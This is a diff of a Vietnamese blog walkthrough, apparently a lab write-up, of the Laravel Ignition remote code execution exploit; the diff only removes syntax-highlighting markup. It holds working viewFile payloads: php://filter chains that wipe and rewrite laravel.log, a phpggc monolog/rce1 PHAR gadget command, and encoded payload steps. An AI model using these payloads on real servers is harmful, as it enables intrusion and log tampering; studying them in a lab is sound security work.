@@ -87,9 +87,9 @@
 <p></p>
 <p>Do đó, ta không thể làm được gì nhiều khi sử dụng param <code>variableName</code>.</p>
 <p>Input variable duy nhất còn lại là <code>viewFile</code>, từ đoạn code trên ta có thể viết lại đoạn code rút gọn như sau:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span> $originalContents <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($parameters[<span style="color:#e6db74">&#39;viewFile&#39;</span>]);
-</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">file_put_contents</span>($parameters[<span style="color:#e6db74">&#39;viewFile&#39;</span>], $output);
-</span></span></code></pre></div><h3 id="php-wrappers-changing-a-file">PHP wrappers: changing a file</h3>
+<pre tabindex="0"><code> $originalContents = file_get_contents($parameters[&#39;viewFile&#39;]);
+ file_put_contents($parameters[&#39;viewFile&#39;], $output);
+</code></pre><h3 id="php-wrappers-changing-a-file">PHP wrappers: changing a file</h3>
 <p>Trong Laravel, Laravel sử dụng thự viện <code>Monolog</code> được tích hợp sẵn để cung cấp và hỗ trợ nhiều cách xử lý log khác nhau. Mặc định có một file log được lưu trữ trong thư mục <code>storage/logs</code>.</p>
 <p>Khi ta truyền vào biến <code>viewFile</code> một đường dẫn không tồn tại, file log sẽ gi lại những gì chúng ta nhập.</p>
 <p></p>
@@ -98,33 +98,33 @@
  . Bằng cách sử dụng kết hợp các filter tích hợp, ta có thể chỉnh sửa nội dung của tệp trước khi được trả về.</p>
 <p></p>
 <p>VD:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;hello&#39;</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">base64</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">base64</span> <span style="color:#f92672">&gt;</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">tmp</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tu</span><span style="color:#f92672">.</span><span style="color:#a6e22e">txt</span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#a6e22e">cat</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">tmp</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tu</span><span style="color:#f92672">.</span><span style="color:#a6e22e">txt</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">aGVsbG8K</span>
-</span></span></code></pre></div><p>Sau đó, viết một script PHP thực hiện các thao tác <code>read</code> và <code>write</code> file tương tự như các thao tác được sử dụng trong Ignition.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span>$file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;php://filter/convert.base64-decode/resource=/tmp/tu.txt&#39;</span>;
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// Đọc file /tmp/tu.txt và base64-decode sau đó lưu vào biến $contents
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$contents <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($file);
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// Base64-decode biến $contents sau đó ghi đè lên dữ liệu cũ
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">file_put_contents</span>($file, $contents);
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#a6e22e">cat</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">tmp</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tu</span><span style="color:#f92672">.</span><span style="color:#a6e22e">txt</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">hello</span>
-</span></span></code></pre></div><p>Khi decode-base64, base64 sẽ không decode những kí tự không nằm trong <a href="https://en.wikipedia.org/wiki/Base64" target="_blank" rel="noopener noreffer"><code>Base64 Encoding Alphabet</code></a>
+<pre tabindex="0"><code>$ echo &#39;hello&#39; | base64 | base64 &gt; /tmp/tu.txt
+$ cat /tmp/tu.txt
+aGVsbG8K
+</code></pre><p>Sau đó, viết một script PHP thực hiện các thao tác <code>read</code> và <code>write</code> file tương tự như các thao tác được sử dụng trong Ignition.</p>
+<pre tabindex="0"><code>&lt;?php
+$file = &#39;php://filter/convert.base64-decode/resource=/tmp/tu.txt&#39;;
+// Đọc file /tmp/tu.txt và base64-decode sau đó lưu vào biến $contents
+$contents = file_get_contents($file);
+// Base64-decode biến $contents sau đó ghi đè lên dữ liệu cũ
+file_put_contents($file, $contents);
+</code></pre><pre tabindex="0"><code>$ cat /tmp/tu.txt
+hello
+</code></pre><p>Khi decode-base64, base64 sẽ không decode những kí tự không nằm trong <a href="https://en.wikipedia.org/wiki/Base64" target="_blank" rel="noopener noreffer"><code>Base64 Encoding Alphabet</code></a>
  mà loại bỏ chúng.</p>
 <p>VD:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;SGVsbG8K!!!!;;&#39;</span> <span style="color:#f92672">&gt;</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">tmp</span><span style="color:#f92672">/</span><span style="color:#a6e22e">test</span><span style="color:#f92672">.</span><span style="color:#a6e22e">txt</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;php://filter/read=convert.base64-decode/resource=/tmp/test.txt&#39;</span>;
-</span></span><span style="display:flex;"><span>$contents <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($file);
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">file_put_contents</span>($file, $contents);
-</span></span></code></pre></div><p>!</p>
+<pre tabindex="0"><code>echo &#39;SGVsbG8K!!!!;;&#39; &gt; /tmp/test.txt
+</code></pre><pre tabindex="0"><code>$file = &#39;php://filter/read=convert.base64-decode/resource=/tmp/test.txt&#39;;
+$contents = file_get_contents($file);
+file_put_contents($file, $contents);
+</code></pre><p>!</p>
 <p>Ta có thể sử dụng cách này để xóa nội dung của file log.</p>
 <p>Như vậy ta đã có đủ 2 điều kiện để sử dụng kỹ thuật Phar Deserialization: Kiểm soát được file <code>laravel.log</code> với Wrapper <code>php://filter</code> và biết được đường dẫn của file <code>laravel.log</code> là <code>storage/logs/laravel.log</code></p>
 <p>Nhưng ta mới chỉ kiểm soát được một phần nhỏ file log, để thực hiện kỹ thuật Phar Deserialization ta cần phải kiểm soát được toàn bộ nội dung của file log.</p>
 <h3 id="deleting-and-writing-the-log-file">Deleting and <strong>Writing the log file</strong></h3>
 <p>Cấu trúc của mỗi đoạn đầu của log như sau:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>[<span style="color:#a6e22e">Date</span>][<span style="color:#a6e22e">Error_data</span>]<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">viewFile</span><span style="color:#f92672">&gt;</span>[<span style="color:#a6e22e">Error_data</span>]<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">viewFile</span><span style="color:#f92672">&gt;</span>[<span style="color:#a6e22e">Error_data</span>]
-</span></span></code></pre></div><p>Trong PHP có nhiều filter chuyển đổi cho nhiều kiểu mã hóa khác nhau. Tất cả đều có tiền tố <a href="https://www.php.net/manual/en/filters.convert.php#filters.convert.iconv" target="_blank" rel="noopener noreffer">convert.iconv.*</a>
+<pre tabindex="0"><code>[Date][Error_data]&lt;viewFile&gt;[Error_data]&lt;viewFile&gt;[Error_data]
+</code></pre><p>Trong PHP có nhiều filter chuyển đổi cho nhiều kiểu mã hóa khác nhau. Tất cả đều có tiền tố <a href="https://www.php.net/manual/en/filters.convert.php#filters.convert.iconv" target="_blank" rel="noopener noreffer">convert.iconv.*</a>
  .  Vì cứ 2 byte thì sẽ được 1 char theo mã <code>UTF-16</code> nên khi convert từ <code>UTF16</code> sang <code>UTF-8</code> thì <code>H\0</code> -&gt; <code>H</code>. Do đó ta có thể xóa file log bằng cách truyền vào phía sau mỗi ký tự của payload một NULL byte (<code>\0</code>) sau đó chuyển đổi bảng mã từ  <code>UTF-16</code> sang <code>UTF-8</code>. Còn các cặp 2 byte ở <code>[Error_data]</code> sẽ bị convert thành junk chars giống như dưới đây. Sau đó phần junk chars này sẽ bị loại bỏ ở bước base64 decoding như đã nói ở phía trên:</p>
 <table>
 <thead>
@@ -144,38 +144,38 @@
 </tr>
 </tbody>
 </table>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;[Error_data]H\0e\0l\0l\0o\0[Error_data]H\0e\0l\0l\0o\0[Error_data]&#39;</span>
-</span></span><span style="display:flex;"><span>								  <span style="color:#f92672">&gt;</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">tmp</span><span style="color:#f92672">/</span><span style="color:#a6e22e">test</span><span style="color:#f92672">.</span><span style="color:#a6e22e">txt</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span>$file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;php://filter/read=convert.iconv.utf16le.utf-8/resource
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">					=/tmp/test.txt&#39;</span>;
-</span></span><span style="display:flex;"><span>$contents <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($file); 
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">file_put_contents</span>($file, $contents); 
-</span></span></code></pre></div><p></p>
+<pre tabindex="0"><code>echo &#39;[Error_data]H\0e\0l\0l\0o\0[Error_data]H\0e\0l\0l\0o\0[Error_data]&#39;
+								  &gt; /tmp/test.txt
+</code></pre><pre tabindex="0"><code>&lt;?php
+$file = &#39;php://filter/read=convert.iconv.utf16le.utf-8/resource
+					=/tmp/test.txt&#39;;
+$contents = file_get_contents($file); 
+file_put_contents($file, $contents); 
+</code></pre><p></p>
 <p>Vì payload xuất hiện 2 lần nên ta cần loại bỏ đi một cái mới đúng cấu trúc của file Phar. Ta chỉ cần thêm 1 byte vào cuối payload 1 và sử dụng cách trên convert payload từ <code>UTF16</code> sang <code>UTF8</code> để biến payload thứ 2 thành junk chars (vì <code>UTF16</code> làm việc với 2 byte nên byte alignment của payload thứ 2 sẽ bị lệch):</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;[Error_data]H\0e\0l\0l\0o\0a[Error_data]H\0e\0l\0l\0o\0a[Error_data]&#39;</span> 
-</span></span><span style="display:flex;"><span>									<span style="color:#f92672">&gt;</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">tmp</span><span style="color:#f92672">/</span><span style="color:#a6e22e">test</span><span style="color:#f92672">.</span><span style="color:#a6e22e">txt</span>
-</span></span></code></pre></div><p></p>
+<pre tabindex="0"><code>echo &#39;[Error_data]H\0e\0l\0l\0o\0a[Error_data]H\0e\0l\0l\0o\0a[Error_data]&#39; 
+									&gt; /tmp/test.txt
+</code></pre><p></p>
 <p>Nhưng payload được truyền vào hàm <code>file_get_contents()</code> dưới dạng đường dẫn của tệp, do đó, ta sẽ không thể truyền vào các NULL byte (<code>\00</code>) để biểu diễn payload ở định dạng <code>UTF-16</code>. Nên ta có thể thay thế bằng ký tự <code>=00</code> sau đó sử dụng filter <a href="https://www.php.net/manual/en/filters.convert.php#filters.covert.quoted-printable" target="_blank" rel="noopener noreffer">convert.quoted-printable</a>
   ****để convert các ký tự <code>=00</code> thành NULL byte (<code>\00</code>).</p>
 <p></p>
 <p>Vậy, kết luận chúng ta sẽ có Payload cuối cùng là:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e6db74">&#34;viewFile&#34;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;php://filter/write=convert.quoted-printable-decode
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">				|convert.iconv.utf-16le.utf-8
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">				|convert.base64-decode/resource=../storage/logs/laravel.log&#34;</span>
-</span></span></code></pre></div><p>Trong đó:</p>
+<pre tabindex="0"><code>&#34;viewFile&#34; : &#34;php://filter/write=convert.quoted-printable-decode
+				|convert.iconv.utf-16le.utf-8
+				|convert.base64-decode/resource=../storage/logs/laravel.log&#34;
+</code></pre><p>Trong đó:</p>
 <ul>
 <li><code>convert.quoted-printable-decode</code>: decode các string có giá trị là <code>=00</code> thành byte <code>\00</code>(NULL byte).</li>
 <li><code>convert.iconv.utf-16le.utf-8</code>: convert từ UTF-16 thành UTF-8 (chuyển đổi nội dung log không mong muốn bằng cách gộp 2 byte lại để chuyển thành các junk chars).</li>
 <li><code>convert.base64-decode</code>: xóa các byte bị convert sang utf-8 mà nằm ngoài bảng mã.</li>
 </ul>
 <p>Nhưng vì sử dụng bảng mã <code>UTF-16</code> nên kích thước file log cần phải là bội số của 2 byte, nên ta cần gửi hai request như dưới đây, vì các <code>Error_data[1,2,3]</code>sẽ xuất hiện hai lần và <code>PAYLOAD_A</code> và <code>PAYLOAD_B</code> cũng xuất hiện hai lần nên tổng số byte sẽ luôn là số chẵn.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>[<span style="color:#a6e22e">Error_data1</span>]<span style="color:#a6e22e">PAYLOAD_A</span>[<span style="color:#a6e22e">Error_data2</span>]<span style="color:#a6e22e">PAYLOAD_A</span>[<span style="color:#a6e22e">Error_data3</span>]
-</span></span><span style="display:flex;"><span>[<span style="color:#a6e22e">Error_data1</span>]<span style="color:#a6e22e">PAYLOAD_B</span>[<span style="color:#a6e22e">Error_data2</span>]<span style="color:#a6e22e">PAYLOAD_B</span>[<span style="color:#a6e22e">Error_data3</span>]
-</span></span></code></pre></div><p>Để <code>PAYLOAD_A</code> biến mất khi decode-base64, ta sẽ gửi 1 payload với số byte chẵn như <code>AA</code> và biến <code>PAYLOAD_B</code> thành PHAR payload.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>[<span style="color:#a6e22e">Error_data1</span>]<span style="color:#a6e22e">AA</span>[<span style="color:#a6e22e">Error_data2</span>]<span style="color:#a6e22e">AA</span>[<span style="color:#a6e22e">Error_data3</span>]
-</span></span><span style="display:flex;"><span>[<span style="color:#a6e22e">Error_data1</span>]<span style="color:#a6e22e">PAYLOAD_B</span>[<span style="color:#a6e22e">Error_data2</span>]<span style="color:#a6e22e">PAYLOAD_B</span>[<span style="color:#a6e22e">Error_data3</span>]
-</span></span></code></pre></div><ul>
+<pre tabindex="0"><code>[Error_data1]PAYLOAD_A[Error_data2]PAYLOAD_A[Error_data3]
+[Error_data1]PAYLOAD_B[Error_data2]PAYLOAD_B[Error_data3]
+</code></pre><p>Để <code>PAYLOAD_A</code> biến mất khi decode-base64, ta sẽ gửi 1 payload với số byte chẵn như <code>AA</code> và biến <code>PAYLOAD_B</code> thành PHAR payload.</p>
+<pre tabindex="0"><code>[Error_data1]AA[Error_data2]AA[Error_data3]
+[Error_data1]PAYLOAD_B[Error_data2]PAYLOAD_B[Error_data3]
+</code></pre><ul>
 <li>
 <p>Note:</p>
 <p>Các <code>Error_data</code> có kích thước giống nhau vì nó gặp lỗi ở cùng một vị trí nên các <code>Error_data</code> sẽ giống nhau. VÌ vậy, trong mọi trường hợp, kích thước của file log luôn là số chẵn.</p>
@@ -187,20 +187,20 @@
 <li>
 <p>Note</p>
 <p>Ngoài ra ta có thể sử dụng filter <code>consumed</code> (undocument) để xóa nội dung file log bằng cách:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">php</span><span style="color:#f92672">://</span><span style="color:#a6e22e">filter</span><span style="color:#f92672">/</span><span style="color:#a6e22e">write</span><span style="color:#f92672">=</span><span style="color:#a6e22e">consumed</span><span style="color:#f92672">/</span><span style="color:#a6e22e">resources</span><span style="color:#f92672">=../</span><span style="color:#a6e22e">storage</span><span style="color:#f92672">/</span><span style="color:#a6e22e">logs</span><span style="color:#f92672">/</span><span style="color:#a6e22e">laravel</span><span style="color:#f92672">.</span><span style="color:#a6e22e">log</span>
-</span></span></code></pre></div><p>Ngoài ra, nếu sử dụng filter <code>base64-decode</code> lên một chuỗi có chứa dấu <code>=</code> ở giữa, PHP sẽ tạo ra lỗi và không trả về kết quả nào.</p>
+<pre tabindex="0"><code>php://filter/write=consumed/resources=../storage/logs/laravel.log
+</code></pre><p>Ngoài ra, nếu sử dụng filter <code>base64-decode</code> lên một chuỗi có chứa dấu <code>=</code> ở giữa, PHP sẽ tạo ra lỗi và không trả về kết quả nào.</p>
 </li>
 </ul>
 <h2 id="create-payload-with-phpggc">Create Payload with PHPGGC</h2>
 <p>Ở đây ta sẽ sử dụng <a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener noreffer">phpggc</a>
  để tạo payload. Công cụ này tạo ra các gadget-chains cho các cuộc tấn công PHP Deserialization. Và nó có thể tạo payload dưới dạng PHAR file với argument <code>--phar phar</code>.</p>
 <p>Như đã nói ở trên, <code>Monolog</code> là một thư viện có sẵn trong Laravel nên ta sẽ sử dụng gadget <code>monolog/rce1</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">php</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">d</span><span style="color:#e6db74">&#39;phar.readonly=0&#39;</span> <span style="color:#f92672">./</span><span style="color:#a6e22e">phpggc</span> <span style="color:#a6e22e">monolog</span><span style="color:#f92672">/</span><span style="color:#a6e22e">rce1</span> <span style="color:#a6e22e">system</span> <span style="color:#e6db74">&#39;id&#39;</span> 
-</span></span><span style="display:flex;"><span>					<span style="color:#f92672">--</span><span style="color:#a6e22e">phar</span> <span style="color:#a6e22e">phar</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">o</span> <span style="color:#a6e22e">php</span><span style="color:#f92672">://</span><span style="color:#a6e22e">output</span> 
-</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#a6e22e">base64</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">w0</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#a6e22e">python</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">c</span> 
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;print(&#39;&#39;.join([&#39;=&#39; + hex(ord(i))[2:] + &#39;=00&#39; for i in input()]).upper())&#34;</span>
-</span></span></code></pre></div><ul>
+<pre tabindex="0"><code>php -d&#39;phar.readonly=0&#39; ./phpggc monolog/rce1 system &#39;id&#39; 
+					--phar phar -o php://output 
+| base64 -w0
+| python -c 
+&#34;print(&#39;&#39;.join([&#39;=&#39; + hex(ord(i))[2:] + &#39;=00&#39; for i in input()]).upper())&#34;
+</code></pre><ul>
 <li>
 <p>Trong đó:</p>
 <p><code>-d'phar.readonly=0'</code>: Đây là tùy chọn dòng lệnh cho PHP cho phép sửa đổi các tệp Phar. Theo mặc định, PHP sẽ chỉ cho phép đọc tệp Phar, nhưng tùy chọn này cho phép ghi và sửa đổi nội dung của tệp Phar.</p>
@@ -215,89 +215,89 @@
 <ul>
 <li>docker-compose.yml</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">version</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;2&#39;</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">services</span><span style="color:#f92672">:</span>
-</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">web</span><span style="color:#f92672">:</span>
-</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">build</span><span style="color:#f92672">:</span> .
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">image</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">vulhub</span><span style="color:#f92672">/</span><span style="color:#a6e22e">laravel</span><span style="color:#f92672">:</span><span style="color:#ae81ff">8.4.2</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ports</span><span style="color:#f92672">:</span>
-</span></span><span style="display:flex;"><span>         <span style="color:#f92672">-</span> <span style="color:#e6db74">&#34;3333:80&#34;</span>
-</span></span></code></pre></div><ul>
+<pre tabindex="0"><code>version: &#39;2&#39;
+services:
+ web:
+		build: .
+    image: vulhub/laravel:8.4.2
+    ports:
+         - &#34;3333:80&#34;
+</code></pre><ul>
 <li>Dockerfile</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">RUN</span> <span style="color:#a6e22e">pecl</span> <span style="color:#a6e22e">install</span> <span style="color:#a6e22e">xdebug</span><span style="color:#f92672">-</span><span style="color:#ae81ff">3.1.5</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">docker</span><span style="color:#f92672">-</span><span style="color:#a6e22e">php</span><span style="color:#f92672">-</span><span style="color:#a6e22e">ext</span><span style="color:#f92672">-</span><span style="color:#a6e22e">enable</span> <span style="color:#a6e22e">xdebug</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">echo</span> <span style="color:#e6db74">&#34;[xdebug]&#34;</span> 
-</span></span><span style="display:flex;"><span>		<span style="color:#f92672">&gt;&gt;</span> <span style="color:#960050;background-color:#1e0010">/usr/local/etc/php/php.ini</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">echo</span> <span style="color:#e6db74">&#34;zend_extension=xdebug.so&#34;</span> 
-</span></span><span style="display:flex;"><span>		<span style="color:#f92672">&gt;&gt;</span> <span style="color:#960050;background-color:#1e0010">/usr/local/etc/php/php.ini</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">echo</span> <span style="color:#e6db74">&#34;xdebug.mode=develop,debug&#34;</span> 
-</span></span><span style="display:flex;"><span>		<span style="color:#f92672">&gt;&gt;</span> <span style="color:#960050;background-color:#1e0010">/usr/local/etc/php/php.ini</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">echo</span> <span style="color:#e6db74">&#34;xdebug.start_with_request=yes&#34;</span> 
-</span></span><span style="display:flex;"><span>		<span style="color:#f92672">&gt;&gt;</span> <span style="color:#960050;background-color:#1e0010">/usr/local/etc/php/php.ini</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">echo</span> <span style="color:#e6db74">&#34;xdebug.log=/tmp/xdebug_remote.log&#34;</span> 
-</span></span><span style="display:flex;"><span>		<span style="color:#f92672">&gt;&gt;</span> <span style="color:#960050;background-color:#1e0010">/usr/local/etc/php/php.ini</span>
-</span></span></code></pre></div></li>
+<pre tabindex="0"><code>RUN pecl install xdebug-3.1.5
+&amp;&amp; docker-php-ext-enable xdebug
+&amp;&amp; echo &#34;[xdebug]&#34; 
+		&gt;&gt; /usr/local/etc/php/php.ini
+&amp;&amp; echo &#34;zend_extension=xdebug.so&#34; 
+		&gt;&gt; /usr/local/etc/php/php.ini
+&amp;&amp; echo &#34;xdebug.mode=develop,debug&#34; 
+		&gt;&gt; /usr/local/etc/php/php.ini
+&amp;&amp; echo &#34;xdebug.start_with_request=yes&#34; 
+		&gt;&gt; /usr/local/etc/php/php.ini
+&amp;&amp; echo &#34;xdebug.log=/tmp/xdebug_remote.log&#34; 
+		&gt;&gt; /usr/local/etc/php/php.ini
+</code></pre></li>
 </ul>
 <ol>
 <li>Đầu tiên, ta tiến hành xóa log trong file <code>laravel.log</code> bằng <code>consumed</code> filter.</li>
 </ol>
 <p>Payload:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e6db74">&#34;viewFile&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;php://filter/read=consumed/resource=../storage/logs/laravel.log&#34;</span>
-</span></span></code></pre></div><p></p>
+<pre tabindex="0"><code>&#34;viewFile&#34;:&#34;php://filter/read=consumed/resource=../storage/logs/laravel.log&#34;
+</code></pre><p></p>
 <ol start="2">
 <li>Gửi payload <code>AA</code> để căn chỉnh kích thước của file log.</li>
 </ol>
 <p>Payload:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e6db74">&#34;viewFile&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;AA&#34;</span>
-</span></span></code></pre></div><p></p>
+<pre tabindex="0"><code>&#34;viewFile&#34;:&#34;AA&#34;
+</code></pre><p></p>
 <ol start="3">
 <li>Tạo log chứa payload:</li>
 </ol>
 <p>Payload: (whoami)</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e6db74">&#34;viewFile&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;=50=00=44=00=39=00=77=00=61=00=48=00...=67=00=3D=00=3D=00a&#34;</span>
-</span></span></code></pre></div><p></p>
+<pre tabindex="0"><code>&#34;viewFile&#34;:&#34;=50=00=44=00=39=00=77=00=61=00=48=00...=67=00=3D=00=3D=00a&#34;
+</code></pre><p></p>
 <ol start="4">
 <li>Convert file log sang PHAR file.</li>
 </ol>
 <p>Payload:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e6db74">&#34;viewFile&#34;</span><span style="color:#f92672">:</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;php://filter/write=convert.quoted-printable-decode
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">			|convert.iconv.utf-16le.utf-8
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">			|convert.base64-decode/resource=../storage/logs/laravel.log&#34;</span>
-</span></span></code></pre></div><p></p>
+<pre tabindex="0"><code>&#34;viewFile&#34;:
+&#34;php://filter/write=convert.quoted-printable-decode
+			|convert.iconv.utf-16le.utf-8
+			|convert.base64-decode/resource=../storage/logs/laravel.log&#34;
+</code></pre><p></p>
 <ul>
 <li>
 <p>Debug</p>
 <ul>
 <li><code>convert.quoted-printable-decode</code>: decode các string có giá trị là <code>=00</code> thành byte <code>\00</code>(NULL byte).</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e6db74">&#34;viewFile&#34;</span><span style="color:#f92672">:</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;php://filter/write=convert.quoted-printable-decode
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">						/resource=../storage/logs/laravel.log&#34;</span>
-</span></span></code></pre></div><p></p>
